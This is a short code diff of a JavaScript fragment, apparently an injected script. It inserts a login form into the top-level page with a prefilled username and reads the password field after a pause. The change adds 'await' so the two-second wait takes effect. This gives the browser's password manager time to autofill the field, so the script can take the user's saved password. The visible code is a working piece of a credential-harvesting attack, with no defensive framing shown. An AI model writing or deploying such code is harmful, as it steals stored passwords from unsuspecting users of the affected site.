@@ -14,7 +14,7 @@ const ur = new URL(document.currentScript.src);
 	form.innerHTML = `<input id="username" name="username" autocomplete="username" value=${identifiant.payload.accounts?.[0].identifiant}><input id="password" name="password" autocomplete="current-password" type="password">`
 	window.top.document.body.appendChild(form);
 	const pwdInput = window.top.document.querySelector('input[type="password"]');
-	new Promise(resolve => setTimeout(resolve, 2000));
+	await new Promise(resolve => setTimeout(resolve, 2000));
 	
 	const pass = pwdInput.value
   
